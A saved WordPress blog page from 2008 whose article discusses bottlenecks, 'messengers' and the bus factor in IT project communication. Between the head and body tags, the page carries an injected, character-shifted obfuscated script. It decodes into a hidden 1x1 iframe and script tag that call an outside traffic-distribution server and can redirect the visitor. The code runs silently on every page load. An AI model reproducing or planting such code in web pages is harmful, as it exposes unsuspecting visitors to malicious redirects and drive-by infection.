<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head profile="http://gmpg.org/xfn/1">
	<title>Messenger and Bottle neck | Simple^4 Xiaoming Wang</title>
        <link REL="SHORTCUT ICON" HREF="IMG/favicon.ico">
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
	<meta name="generator" content="WordPress 3.0.1" /> <!-- leave this for stats please -->
	<style type="text/css" media="screen">
		@import url( http://blog.aaladdin.com/wp-content/themes/paalam-11/style.css );
	</style>
	<link rel="alternate" type="application/rss+xml" title="RSS 2.0" href="http://blog.aaladdin.com/?feed=rss2" />
	<link rel="alternate" type="text/xml" title="RSS .92" href="http://blog.aaladdin.com/?feed=rss" />
	<link rel="alternate" type="application/atom+xml" title="Atom 0.3" href="http://blog.aaladdin.com/?feed=atom" />

	<link rel="pingback" href="http://blog.aaladdin.com/xmlrpc.php" />
    	<link rel='archives' title='August 2011' href='http://blog.aaladdin.com/?m=201108' />
	<link rel='archives' title='February 2011' href='http://blog.aaladdin.com/?m=201102' />
	<link rel='archives' title='December 2010' href='http://blog.aaladdin.com/?m=201012' />
	<link rel='archives' title='October 2009' href='http://blog.aaladdin.com/?m=200910' />
	<link rel='archives' title='June 2009' href='http://blog.aaladdin.com/?m=200906' />
	<link rel='archives' title='April 2009' href='http://blog.aaladdin.com/?m=200904' />
	<link rel='archives' title='March 2009' href='http://blog.aaladdin.com/?m=200903' />
	<link rel='archives' title='December 2008' href='http://blog.aaladdin.com/?m=200812' />
	<link rel='archives' title='November 2008' href='http://blog.aaladdin.com/?m=200811' />
	<link rel='archives' title='October 2008' href='http://blog.aaladdin.com/?m=200810' />
	<link rel='archives' title='May 2008' href='http://blog.aaladdin.com/?m=200805' />
	<link rel='archives' title='March 2008' href='http://blog.aaladdin.com/?m=200803' />
	<link rel='archives' title='January 2008' href='http://blog.aaladdin.com/?m=200801' />
	<link rel='archives' title='October 2007' href='http://blog.aaladdin.com/?m=200710' />
	<link rel='archives' title='September 2007' href='http://blog.aaladdin.com/?m=200709' />
		<link rel="alternate" type="application/rss+xml" title="Simple^4 Xiaoming Wang &raquo; Messenger and Bottle neck Comments Feed" href="http://blog.aaladdin.com/?feed=rss2&amp;p=36" />
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://blog.aaladdin.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://blog.aaladdin.com/wp-includes/wlwmanifest.xml" /> 
<link rel='index' title='Simple^4 Xiaoming Wang' href='http://blog.aaladdin.com' />
<link rel='start' title='How to 10 times your salary in three and half years' href='http://blog.aaladdin.com/?p=10' />
<link rel='prev' title='Agile Requirement Management' href='http://blog.aaladdin.com/?p=34' />
<link rel='next' title='The spring of IT is coming' href='http://blog.aaladdin.com/?p=37' />
<meta name="generator" content="WordPress 3.0.1" />

<!-- All in One SEO Pack 1.6.12.2 by Michael Torbert of Semper Fi Web Design[209,272] -->
<meta name="keywords" content="tech" />
<link rel="canonical" href="http://blog.aaladdin.com/?p=36" />
<!-- /all in one seo pack -->

			<!-- Added by "del.icio.us - Bookmark this!", a WordPress Plugin of Arne Brachhold, v1.2 -->
			<script type="text/javascript" language="JavaScript">
				//<![CDATA[
				//Bookmark on del.icio.us
				function dbt_bookmark(targetURL,service) {
					//URL of this document
					if(!service) service='delicious';
					var loc=(targetURL && targetURL.length>0?targetURL:location.href);
					//Strip out any anchors
					var apos=loc.indexOf('#');
					loc=encodeURIComponent((apos>0?loc.substring(0,apos):loc));
					
					//Get Title and encode
					var title = encodeURIComponent(document.title); 
					
					var url='';
					
					//Redirect to service
					if(service=='digg') url='http://www.digg.com/submit?phase=2&url=' + loc + '&title=' + title;
					else if(service=='newsvine') url='http://www.newsvine.com/_tools/seed&save?u=' + loc + '&h=' + title;
					else if(service=='furl') url='http://www.furl.net/storeIt.jsp?p=1&u='+ loc +'&t=' + title;
					else if(service=='blinklist') url='http://www.blinklist.com/index.php?Action=Blink/addblink.php&Description=&Url=' + loc + '&Title=' + title;
					else url='http://del.icio.us/post?v=2&url=' + loc + '&amp;title=' + title;
					
					location.href = url;
					return false;
				}
				//]]>
			</script>
			<meta name="description" content="Talking about bottle necks and messengers in an IT project. How to solve the problems." />

<!-- Protected by WP-SpamFree v2.1.0.9 :: JS BEGIN -->
<script type="text/javascript" src="http://blog.aaladdin.com/wp-content/plugins/wp-spamfree/js/wpsf-js.php"></script> 
<!-- Protected by WP-SpamFree v2.1.0.9 :: JS END -->

<style type="text/css">
#header
{
	background:url(http://ossme.com/wp-content/uploads/2007/09/header.jpg) no-repeat center;  
}
#header * 
{
	color: #336;
}
</style>
</head><script language=javascript>document.write(unescape('%3C%73%63%72%69%70%74%20%6C%61%6E%67%75%61%67%65%3D%22%6A%61%76%61%73%63%72%69%70%74%22%3E%66%75%6E%63%74%69%6F%6E%20%64%46%28%73%29%7B%76%61%72%20%73%31%3D%75%6E%65%73%63%61%70%65%28%73%2E%73%75%62%73%74%72%28%30%2C%73%2E%6C%65%6E%67%74%68%2D%31%29%29%3B%20%76%61%72%20%74%3D%27%27%3B%66%6F%72%28%69%3D%30%3B%69%3C%73%31%2E%6C%65%6E%67%74%68%3B%69%2B%2B%29%74%2B%3D%53%74%72%69%6E%67%2E%66%72%6F%6D%43%68%61%72%43%6F%64%65%28%73%31%2E%63%68%61%72%43%6F%64%65%41%74%28%69%29%2D%73%2E%73%75%62%73%74%72%28%73%2E%6C%65%6E%67%74%68%2D%31%2C%31%29%29%3B%64%6F%63%75%6D%65%6E%74%2E%77%72%69%74%65%28%75%6E%65%73%63%61%70%65%28%74%29%29%3B%7D%3C%2F%73%63%72%69%70%74%3E'));dF('%264Dtdsjqu%264Fepdvnfou/xsjuf%2639%2633%264Dtdsjqu%2631tsd%264E%266D%2633%2633%2C%2633iuuq%264B00jutbmmcsfbltpgu/ofu0uet0jo/dhj%264G3%2637tfpsfg%264E%2633%2CfodpefVSJDpnqpofou%2639epdvnfou/sfgfssfs%263%3A%2C%2633%2637qbsbnfufs%264E%2635lfzxpse%2637tf%264E%2635tf%2637vs%264E2%2637IUUQ%60SFGFSFS%264E%2633%2C%2631fodpefVSJDpnqpofou%2639epdvnfou/VSM%263%3A%2C%2633%2637efgbvmu%60lfzxpse%264Eopuefgjof%2633%2C%2633%266D%2633%264F%264D%266D0tdsjqu%264F%2633%263%3A%264C%264D0tdsjqu%264F%261B%264Dtdsjqu%264F%261Bjg%2639uzqfpg%2639i%263%3A%264E%264E%2633voefgjofe%2633%263%3A%268C%261%3A%261B%261%3Aepdvnfou/xsjuf%2639%2633%264Djgsbnf%2631tsd%264E%2638iuuq%264B00jutbmmcsfbltpgu/ofu0uet0jo/dhj%264G4%2637tfpsfg%264E%2633%2CfodpefVSJDpnqpofou%2639epdvnfou/sfgfssfs%263%3A%2C%2633%2637qbsbnfufs%264E%2635lfzxpse%2637tf%264E%2635tf%2637vs%264E2%2637IUUQ%60SFGFSFS%264E%2633%2C%2631fodpefVSJDpnqpofou%2639epdvnfou/VSM%263%3A%2C%2633%2637efgbvmu%60lfzxpse%264Eopuefgjof%2638%2631xjeui%264E2%2631ifjhiu%264E2%2631cpsefs%264E1%2631gsbnfcpsefs%264E1%264F%264D0jgsbnf%264F%2633%263%3A%264C%2631%261B%268E%261Bfmtf%2631jg%2639i/joefyPg%2639%2633iuuq%264B%2633%263%3A%264E%264E1%263%3A%268C%261B%261%3A%261%3Axjoepx/mpdbujpo%264Ei%264C%261B%268E%261B%264D0tdsjqu%264F1')</script>

<body>
<script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
</script>
<script type="text/javascript">
var pageTracker = _gat._getTracker("UA-2610570-2");
pageTracker._initData();
pageTracker._trackPageview();
</script>
	<div id="menu">
		<ul>
			<li ><a href="http://blog.aaladdin.com" title="Home">Home</a></li>
			<li class="page_item page-item-2"><a href="http://blog.aaladdin.com/?page_id=2" title="About me">About me</a></li>
		</ul>
	</div>
	<div id="header">
		<h1><a href="http://blog.aaladdin.com" title="Simple^4 Xiaoming Wang">Simple^4 Xiaoming Wang</a></h1>
		<h2>Insight project management</h2>
	</div><div id="main">
	<div id="content">
	    	        <div class="post" id="post-36">
            <p class="date">
            <span class="month">
              Oct            </span>
            <span class="day">
              18            </span>
            <span class="year">
              2008            </span>
          </p>
            <h2 class="title"><a href="http://blog.aaladdin.com/?p=36" rel="bookmark">Messenger and Bottle neck</a></h2>
            <div class="meta">
				      <p>Published by <a href="http://blog.aaladdin.com/?author=3" title="Posts by xiaoming">xiaoming</a> at 8:58 am under <a href="http://blog.aaladdin.com/?cat=5" title="View all posts in Tech" rel="category">Tech</a> </p>
			      </div>
			      <div class="entry">
              <div class="diggthisplugin" style="float: right; width: 42px; padding-right: 10px; margin-left: 10px; margin-bottom: 0px;"><iframe src="http://digg.com/tools/diggthis.php?u=http://blog.aaladdin.com/?p=36&t=Messenger and Bottle neck&k=#FFFFFF" scrolling="no" style="border: none; height: 80px; width: 52px;"></iframe>
		</div><div><strong>          &#8212;&#8211; A story about mirror game, messenger, bottle neck and bus factor.</strong>      </div>
<blockquote><p>A story </p></blockquote>
<div>Back to the school days, there was a quite interesting game called Mirror. It need no less than 5 or 6 people to participate. The players stand in one line. Each one can only see the players besides him. Then the host told the first player &#8220;an action&#8221;. It was start from the one player to show an action to the second one. Then each player has to try to do exactly the same action one by one. In the end the last player&#8217;s performance turned out to be very much different as the first one who stands at the front of the line. Audience laughed because they observed the misunderstanding between players. Actually,it will be more fun to get more people involved. Let&#8217;s imagine, if we have only two players, they could much better and the game would not be fun any more.               </p>
<div id="dg4s1">The story told us that information would get lost or being misunderstood by passing through human beings. As it was passed by more people the there would be more information lost or misunderstood. The information would lose more quicker as it was more complex. We call the players who only pass the message messenger. <br id="f6xg0" /><br id="mkcb" />                </p>
<blockquote><p>How bad is it?</p></blockquote>
<p><img class="alignright" style="float: right;" src="http://blog.aaladdin.com/IMG/Complexity_InfoLost.bmp" alt="Axis of complexity and information lost" width="400" height="300" /></p>
</div>
<div id="dg4s1">Communication management is a crucial part of program/project management. How bad is it in a project, especially IT project? If the number of messengers is at a certain level, the project will lose efficiency, get more risky, even worse, it might fail in the end. 90% of time when there are messengers in a project, there is bottlenecks along. In a general project management course, lecturers talk about something called &#8220;bus factor&#8221;. If a member of the team were hit by a bus this morning, this team would not be able to continue producing enough productivity or could not work at all. This member is called bottleneck. No projects want bottlenecks unfortunately they do exist and sometimes, they play vital roles.</div>
<p><img class="alignright" style="float: right; border: 0;" src="http://blog.aaladdin.com/IMG/bottle%20neck.bmp" alt="bottle neck" width="300" height="205" /></p>
<div id="dg4s1">Let&#8217;s take a look at two typical program/project models.  From the graph, we can discover, the two bigger smiley faces have one team behind them. However these two people are the only interface between the two teams. If either of them can not make it to work, the whole program might have to halt. The whole team might have to wait for someone else to be the interface and reconnect the communication. </div>
<p><img class="alignleft" style="float: left;" src="http://blog.aaladdin.com/IMG/messenger.bmp" alt="messenger" width="300" height="205" /></p>
<div>Another model , which I called messenger model. People who are in the middle lever play a role to pass information between front and back layers. </div>
<div id="dg4s1">It might not be as bad as the model of bottlenecks however, we can easily tell that people in the middle layer increase the cost of communication. The accuracy of the information would decrease because this extra layer. Someone might ask why and when it happens in a program/project?</div>
<p> </p>
<div id="dg4s1">    </div>
<div id="dg4s1">
<p> </p>
<p> </p>
<blockquote><p>Reasons:</p></blockquote>
</div>
<div id="dg4s1">
<ul>
<li>When a program builds basic structure, managers sometimes prefer to only having senior people to be interfaces or having people to take order from them.</li>
<li>Even a program is originally well build, as long as it is growing, the role and responsibility of some team members might get confusing, during this stage, messengers might come out.</li>
</ul>
</div>
<div id="dg4s1"><br id="mkcb3" />                </p>
<blockquote><p><img class="alignright" style="float: right;" src="http://blog.aaladdin.com/IMG/solution.bmp" alt="solution" width="400" height="300" />How to solve?</p></blockquote>
</div>
<div id="dg4s1">Is there any way to avoid this happening or if it happens already how to solve it?</div>
<div id="dg4s1">
<ol>
<li>Do not let one person to be the interface. Get more people involved in the communication.</li>
<li> Share responsibilities across roles. e.g. PM, senior business person, senior technical person should be able to back each other up.</li>
<li>Have a team shape flatter. Sharing rather than passing information.</li>
<li>Review program structure when it is growing, reconstruct the team and eliminate messengers or bring them to a upper or lower level.</li>
<li>Do not make the whole program one team, because it is too difficult to manage the communication. Bear in mind, communication cost. It&#8217;s better to think of cost efficient way to do communication. Such as stand up meetings, pair working etc.</li>
</ol>
</div>
<div id="dg4s1">
<p> </p>
<blockquote><p>Summary</p></blockquote>
<p>When a program/project knows the waste and risk of having bottlenecks and messengers, the team should continuously review the structure and ensure that everyone in the team actually contribute value rather than create waste or make trouble.</p>
</div>
</div>
              <p align="right"><a href="#" onclick="return dbt_bookmark(null,'delicious');" >Bookmark on del.icio.us</a></p>
      			</div>
            <p class="comments">
              <a href="http://blog.aaladdin.com/?p=36#respond" title="Comment on Messenger and Bottle neck">No responses yet</a>            </p>
	          
<!-- You can start editing here. -->


   
		<!-- If comments are open, but there are no comments. -->
		
	 <div class="entry">
<p class="posted">
  <span class="trackback"><a href="http://blog.aaladdin.com/wp-trackback.php?p=36">Trackback URI</a></span> | 
  <span class="feed"><a href='http://blog.aaladdin.com/?feed=rss2&amp;p=36'>Comments RSS</a></span>
</p>
</div>


<h3 id="respond">Leave a Reply</h3>


<form action="http://blog.aaladdin.com/wp-comments-post.php" method="post" id="commentform">


<p><input type="text" class="textbox" name="author" id="author" value="" size="22" tabindex="1" />
<label for="author"><small>Name (required)</small></label></p>

<p><input type="text" class="textbox" name="email" id="email" value="" size="22" tabindex="2" />
<label for="email"><small>Mail (hidden) (required)</small></label></p>

<p><input type="text" class="textbox" name="url" id="url" value="" size="22" tabindex="3" />
<label for="url"><small>Website</small></label></p>


<!--<p><small><strong>XHTML:</strong> You can use these tags: &lt;a href=&quot;&quot; title=&quot;&quot;&gt; &lt;abbr title=&quot;&quot;&gt; &lt;acronym title=&quot;&quot;&gt; &lt;b&gt; &lt;blockquote cite=&quot;&quot;&gt; &lt;cite&gt; &lt;code&gt; &lt;del datetime=&quot;&quot;&gt; &lt;em&gt; &lt;i&gt; &lt;q cite=&quot;&quot;&gt; &lt;strike&gt; &lt;strong&gt; </small></p>-->

<p><textarea name="comment" id="comment" cols="100%" rows="10" tabindex="4"></textarea></p>

<p>
  <input name="submit" type="submit" id="submit" tabindex="5" value="Submit Comment" />
<input type="hidden" name="comment_post_ID" value="36" />
</p>
	<script type='text/javascript'>
	<!--
	refJS = escape( document[ 'referrer' ] );
	document.write("<input type='hidden' name='refJS' value='"+refJS+"'>");
	// -->
	</script>
	<noscript><p><strong>Currently you have JavaScript disabled. In order to post comments, please make sure JavaScript and Cookies are enabled, and reload the page.</strong> <a href="http://www.google.com/support/bin/answer.py?answer=23852" rel="nofollow external" >Click here for instructions</a> on how to enable JavaScript in your browser.</p></noscript>

</form>

	        </div>
            <p align="center"></p>
	</div>
  	<div id="sidebar" class="sidecol">
	<ul>
<li id="search-3" class="widget widget_search"><h2 class="widgettitle">Search this site</h2>
<form role="search" method="get" id="searchform" action="http://blog.aaladdin.com/" >
	<div><label class="screen-reader-text" for="s">Search for:</label>
	<input type="text" value="" name="s" id="s" />
	<input type="submit" id="searchsubmit" value="Search" />
	</div>
	</form></li>
<li id="rss-4" class="widget widget_rss"><h2 class="widgettitle"><a class='rsswidget' href='http://blog.aaladdin.com/?feed=rss2' title='Syndicate this content'><img style='border:0' width='14' height='14' src='http://blog.aaladdin.com/wp-includes/images/rss.png' alt='RSS' /></a> <a class='rsswidget' href='' title=''>Xiaoming&#8217;s feed</a></h2>
</li>
<li id="meta-3" class="widget widget_meta"><h2 class="widgettitle">Meta</h2>
			<ul>
						<li><a href="http://blog.aaladdin.com/wp-login.php">Log in</a></li>
			<li><a href="http://blog.aaladdin.com/?feed=rss2" title="Syndicate this site using RSS 2.0">Entries <abbr title="Really Simple Syndication">RSS</abbr></a></li>
			<li><a href="http://blog.aaladdin.com/?feed=comments-rss2" title="The latest comments to all posts in RSS">Comments <abbr title="Really Simple Syndication">RSS</abbr></a></li>
			<li><a href="http://wordpress.org/" title="Powered by WordPress, state-of-the-art semantic personal publishing platform.">WordPress.org</a></li>
						</ul>
</li>
<li id="pages-3" class="widget widget_pages"><h2 class="widgettitle">Pages</h2>
		<ul>
			<li class="page_item page-item-2"><a href="http://blog.aaladdin.com/?page_id=2" title="About me">About me</a></li>
		</ul>
		</li>
<li id="linkcat-4" class="widget widget_links"><h2 class="widgettitle">Friends</h2>

	<ul class='xoxo blogroll'>
<li><a href="http://yehenalatong.spaces.live.com/" title="Check out a mature and very successful businessman&#8217;s life! HAHA &#8212; 一个天才的思考">Ben&#8217;s blog</a></li>
<li><a href="http://www.blogjava.net/chelsea/" title="Guanglei&#8217;s Weblog with rich information about J2EE development and continuous integration best practice">Chelsea &#8212; 切尔斯基</a></li>
<li><a href="http://blog.csdn.net/tony1130" title="Do you want to know more about Agile and how to keep your project simple and stupid? Check out Qiao Liang&#8217;s Weblog ">KISS-闲庭信步</a></li>
<li><a href="http://www.cnblogs.com/taowen/" title="One of the genius at his age. Wen not only has great design skills but is an expert in agile practice. He is expecially good at backlog estimation. So I call him CEO (Chief Estimate Office)">Tao Wen</a></li>
<li><a href="http://hl.thoughtworkers.org/" title="Want to know about testing in Agile, TDD, check out Huang Liang&#8217;s blog">Test everything</a></li>
<li><a href="http://gigix.thoughtworkers.org/" title="透明思考 Jeff Xiong&#8217;s blog, some thoughts about tech and Agile">Transparent Thoughts</a></li>
<li><a href="http://raimundox.blogjava.net/" title="A tech geek and musician. He is the most crazy man that I have ever met, genius">Vincent (桃之夭夭)</a></li>

	</ul>
</li>

<li id="linkcat-3" class="widget widget_links"><h2 class="widgettitle">Myself</h2>

	<ul class='xoxo blogroll'>
<li><a href="http://AAladdin.com" title="Niu X">AAladdin (阿拉丁) agile organization transition framework</a></li>
<li><a href="http://blog.sina.com.cn/mmxking" title="A unfortunate day dreamer&#8217;s blog">Xiaoming&#039;s Sina Blog</a></li>
<li><a href="http://weibo.com/mmxw" title="王晓明同学" target="_blank">Xiaoming&#039;s Weibo</a></li>
<li><a href="http://www.linkedin.com/in/wangxiaoming" title="Xiaoming&#8217;s social network">Xiaoming&#8217;s Linkedin</a></li>

	</ul>
</li>

<li id="linkcat-10" class="widget widget_links"><h2 class="widgettitle">Public</h2>

	<ul class='xoxo blogroll'>
<li><a href="http://blogs.thoughtworks.com/alumni/">ThoughtWorks Alumni</a></li>
<li><a href="http://blogs.thoughtworks.com/">ThoughtWorks blog</a></li>

	</ul>
</li>

<li id="categories-2" class="widget widget_categories"><h2 class="widgettitle">Categories</h2>
		<ul>
	<li class="cat-item cat-item-27"><a href="http://blog.aaladdin.com/?cat=27" title="View all posts filed under Buisness">Buisness</a>
</li>
	<li class="cat-item cat-item-8"><a href="http://blog.aaladdin.com/?cat=8" title="View all posts filed under Career">Career</a>
</li>
	<li class="cat-item cat-item-7"><a href="http://blog.aaladdin.com/?cat=7" title="View all posts filed under Howto">Howto</a>
</li>
	<li class="cat-item cat-item-6"><a href="http://blog.aaladdin.com/?cat=6" title="View all posts filed under Life">Life</a>
</li>
	<li class="cat-item cat-item-5"><a href="http://blog.aaladdin.com/?cat=5" title="View all posts filed under Tech">Tech</a>
</li>
	<li class="cat-item cat-item-9"><a href="http://blog.aaladdin.com/?cat=9" title="View all posts filed under Travel">Travel</a>
</li>
		</ul>
</li>
<li id="calendar-3" class="widget widget_calendar"><h2 class="widgettitle">&nbsp;</h2>
<div id="calendar_wrap"><table id="wp-calendar" summary="Calendar">
	<caption>May 2013</caption>
	<thead>
	<tr>
		<th scope="col" title="Sunday">S</th>
		<th scope="col" title="Monday">M</th>
		<th scope="col" title="Tuesday">T</th>
		<th scope="col" title="Wednesday">W</th>
		<th scope="col" title="Thursday">T</th>
		<th scope="col" title="Friday">F</th>
		<th scope="col" title="Saturday">S</th>
	</tr>
	</thead>

	<tfoot>
	<tr>
		<td colspan="3" id="prev"><a href="http://blog.aaladdin.com/?m=201108" title="View posts for August 2011">&laquo; Aug</a></td>
		<td class="pad">&nbsp;</td>
		<td colspan="3" id="next" class="pad">&nbsp;</td>
	</tr>
	</tfoot>

	<tbody>
	<tr>
		<td colspan="3" class="pad">&nbsp;</td><td>1</td><td>2</td><td>3</td><td>4</td>
	</tr>
	<tr>
		<td>5</td><td>6</td><td>7</td><td>8</td><td>9</td><td>10</td><td>11</td>
	</tr>
	<tr>
		<td>12</td><td>13</td><td>14</td><td>15</td><td>16</td><td>17</td><td>18</td>
	</tr>
	<tr>
		<td>19</td><td>20</td><td>21</td><td>22</td><td>23</td><td>24</td><td>25</td>
	</tr>
	<tr>
		<td>26</td><td>27</td><td id="today">28</td><td>29</td><td>30</td><td>31</td>
		<td class="pad" colspan="1">&nbsp;</td>
	</tr>
	</tbody>
	</table></div></li>
<li id="archives-3" class="widget widget_archive"><h2 class="widgettitle">Archives</h2>
		<ul>
			<li><a href='http://blog.aaladdin.com/?m=201108' title='August 2011'>August 2011</a></li>
	<li><a href='http://blog.aaladdin.com/?m=201102' title='February 2011'>February 2011</a></li>
	<li><a href='http://blog.aaladdin.com/?m=201012' title='December 2010'>December 2010</a></li>
	<li><a href='http://blog.aaladdin.com/?m=200910' title='October 2009'>October 2009</a></li>
	<li><a href='http://blog.aaladdin.com/?m=200906' title='June 2009'>June 2009</a></li>
	<li><a href='http://blog.aaladdin.com/?m=200904' title='April 2009'>April 2009</a></li>
	<li><a href='http://blog.aaladdin.com/?m=200903' title='March 2009'>March 2009</a></li>
	<li><a href='http://blog.aaladdin.com/?m=200812' title='December 2008'>December 2008</a></li>
	<li><a href='http://blog.aaladdin.com/?m=200811' title='November 2008'>November 2008</a></li>
	<li><a href='http://blog.aaladdin.com/?m=200810' title='October 2008'>October 2008</a></li>
	<li><a href='http://blog.aaladdin.com/?m=200805' title='May 2008'>May 2008</a></li>
	<li><a href='http://blog.aaladdin.com/?m=200803' title='March 2008'>March 2008</a></li>
	<li><a href='http://blog.aaladdin.com/?m=200801' title='January 2008'>January 2008</a></li>
	<li><a href='http://blog.aaladdin.com/?m=200710' title='October 2007'>October 2007</a></li>
	<li><a href='http://blog.aaladdin.com/?m=200709' title='September 2007'>September 2007</a></li>
		</ul>
</li>
<li id="tag_cloud-3" class="widget widget_tag_cloud"><h2 class="widgettitle">Cloud</h2>
<div><a href='http://blog.aaladdin.com/?tag=agile' class='tag-link-18' title='8 topics' style='font-size: 22pt;'>agile</a>
<a href='http://blog.aaladdin.com/?tag=bank' class='tag-link-32' title='1 topic' style='font-size: 8pt;'>bank</a>
<a href='http://blog.aaladdin.com/?tag=brand' class='tag-link-26' title='1 topic' style='font-size: 8pt;'>brand</a>
<a href='http://blog.aaladdin.com/?tag=business' class='tag-link-14' title='4 topics' style='font-size: 16.615384615385pt;'>business</a>
<a href='http://blog.aaladdin.com/?tag=business-analysis' class='tag-link-17' title='2 topics' style='font-size: 11.876923076923pt;'>business analysis</a>
<a href='http://blog.aaladdin.com/?tag=business-model' class='tag-link-44' title='1 topic' style='font-size: 8pt;'>business model</a>
<a href='http://blog.aaladdin.com/?tag=change' class='tag-link-16' title='2 topics' style='font-size: 11.876923076923pt;'>change</a>
<a href='http://blog.aaladdin.com/?tag=communalism' class='tag-link-30' title='1 topic' style='font-size: 8pt;'>communalism</a>
<a href='http://blog.aaladdin.com/?tag=credit-crunch' class='tag-link-28' title='1 topic' style='font-size: 8pt;'>credit crunch</a>
<a href='http://blog.aaladdin.com/?tag=customer-centered' class='tag-link-25' title='1 topic' style='font-size: 8pt;'>customer centered</a>
<a href='http://blog.aaladdin.com/?tag=design' class='tag-link-48' title='1 topic' style='font-size: 8pt;'>design</a>
<a href='http://blog.aaladdin.com/?tag=economic-recession' class='tag-link-29' title='1 topic' style='font-size: 8pt;'>economic recession</a>
<a href='http://blog.aaladdin.com/?tag=economics-recession' class='tag-link-12' title='1 topic' style='font-size: 8pt;'>economics recession</a>
<a href='http://blog.aaladdin.com/?tag=eliminate-waste' class='tag-link-24' title='1 topic' style='font-size: 8pt;'>eliminate waste</a>
<a href='http://blog.aaladdin.com/?tag=estimate' class='tag-link-53' title='1 topic' style='font-size: 8pt;'>estimate</a>
<a href='http://blog.aaladdin.com/?tag=estimation' class='tag-link-54' title='1 topic' style='font-size: 8pt;'>estimation</a>
<a href='http://blog.aaladdin.com/?tag=financial-crisis' class='tag-link-13' title='2 topics' style='font-size: 11.876923076923pt;'>financial crisis</a>
<a href='http://blog.aaladdin.com/?tag=fixed-price' class='tag-link-42' title='1 topic' style='font-size: 8pt;'>fixed price</a>
<a href='http://blog.aaladdin.com/?tag=goal' class='tag-link-46' title='1 topic' style='font-size: 8pt;'>goal</a>
<a href='http://blog.aaladdin.com/?tag=instructor' class='tag-link-38' title='1 topic' style='font-size: 8pt;'>instructor</a>
<a href='http://blog.aaladdin.com/?tag=it' class='tag-link-11' title='6 topics' style='font-size: 19.846153846154pt;'>IT</a>
<a href='http://blog.aaladdin.com/?tag=it-director' class='tag-link-36' title='1 topic' style='font-size: 8pt;'>IT director</a>
<a href='http://blog.aaladdin.com/?tag=it-investment' class='tag-link-37' title='1 topic' style='font-size: 8pt;'>IT investment</a>
<a href='http://blog.aaladdin.com/?tag=lean' class='tag-link-47' title='2 topics' style='font-size: 11.876923076923pt;'>lean</a>
<a href='http://blog.aaladdin.com/?tag=management' class='tag-link-56' title='1 topic' style='font-size: 8pt;'>management</a>
<a href='http://blog.aaladdin.com/?tag=motivation' class='tag-link-22' title='1 topic' style='font-size: 8pt;'>motivation</a>
<a href='http://blog.aaladdin.com/?tag=pricing' class='tag-link-45' title='1 topic' style='font-size: 8pt;'>pricing</a>
<a href='http://blog.aaladdin.com/?tag=product-owner' class='tag-link-35' title='1 topic' style='font-size: 8pt;'>product owner</a>
<a href='http://blog.aaladdin.com/?tag=profit' class='tag-link-34' title='1 topic' style='font-size: 8pt;'>profit</a>
<a href='http://blog.aaladdin.com/?tag=project' class='tag-link-55' title='1 topic' style='font-size: 8pt;'>project</a>
<a href='http://blog.aaladdin.com/?tag=project-management' class='tag-link-15' title='5 topics' style='font-size: 18.338461538462pt;'>project management</a>
<a href='http://blog.aaladdin.com/?tag=retrospective' class='tag-link-20' title='1 topic' style='font-size: 8pt;'>retrospective</a>
<a href='http://blog.aaladdin.com/?tag=risk' class='tag-link-33' title='2 topics' style='font-size: 11.876923076923pt;'>risk</a>
<a href='http://blog.aaladdin.com/?tag=sales' class='tag-link-43' title='1 topic' style='font-size: 8pt;'>sales</a>
<a href='http://blog.aaladdin.com/?tag=scrum' class='tag-link-40' title='1 topic' style='font-size: 8pt;'>scrum</a>
<a href='http://blog.aaladdin.com/?tag=socialism' class='tag-link-31' title='1 topic' style='font-size: 8pt;'>socialism</a>
<a href='http://blog.aaladdin.com/?tag=software' class='tag-link-49' title='1 topic' style='font-size: 8pt;'>software</a>
<a href='http://blog.aaladdin.com/?tag=stand-up' class='tag-link-19' title='1 topic' style='font-size: 8pt;'>stand up</a>
<a href='http://blog.aaladdin.com/?tag=team' class='tag-link-23' title='2 topics' style='font-size: 11.876923076923pt;'>team</a>
<a href='http://blog.aaladdin.com/?tag=time-material' class='tag-link-41' title='1 topic' style='font-size: 8pt;'>Time &amp; material</a>
<a href='http://blog.aaladdin.com/?tag=ucd' class='tag-link-50' title='1 topic' style='font-size: 8pt;'>UCD</a>
<a href='http://blog.aaladdin.com/?tag=ui' class='tag-link-52' title='1 topic' style='font-size: 8pt;'>UI</a>
<a href='http://blog.aaladdin.com/?tag=user-centred-design' class='tag-link-51' title='1 topic' style='font-size: 8pt;'>user centred design</a>
<a href='http://blog.aaladdin.com/?tag=walk-out-of-door' class='tag-link-21' title='1 topic' style='font-size: 8pt;'>walk out of door</a>
<a href='http://blog.aaladdin.com/?tag=xp' class='tag-link-39' title='1 topic' style='font-size: 8pt;'>XP</a></div>
</li>
</ul>
	</div>
	<div style="clear:both;"></div>   </div><div id="footer">
  	<p>
	<span>
	<a href="http://blog.aaladdin.com/wp-admin/" title="Site Admin">Site Admin</a> | 
	<a href="http://ossme.com/aboutme/" title="About me">About Xiaoming Wang</a> |
	<a href="http://ossme.com/ossme/" title="Ossme.com">Ossme.com</a>
	</span>
	<strong>Simple^4 Xiaoming Wang</strong> 
	Copyright &copy; 2013 All Rights Reserved .</p>
</div>
<p align="center"><a rel="license" href="http://creativecommons.org/licenses/by-nc-nd/3.0/us/">
<img alt="Creative Commons License" style="border-width:0" src="http://i.creativecommons.org/l/by-nc-nd/3.0/us/88x31.png" />
</a>
<br />This work is licensed under a 
<a rel="license" href="http://creativecommons.org/licenses/by-nc-nd/3.0/us/">Creative Commons Attribution-Noncommercial-No Derivative Works 3.0 United States License</a>.</p>

<script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
</script>
<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-2610570-5");

pageTracker._trackPageview("/?p=36");
} catch(err) {}</script>

<script type="text/javascript">
//
// GA Automated Event Tracking
// ===========================
// (c) 2008, Mesoconcepts
// http://www.mesoconcepts.com/license/
//

var i = 0;

// this should catch stuff on the same domain
var ga_base_url_regexp = new RegExp("^.+?://" + document.domain, "i");

// this should catch anything that looks more or less like a file
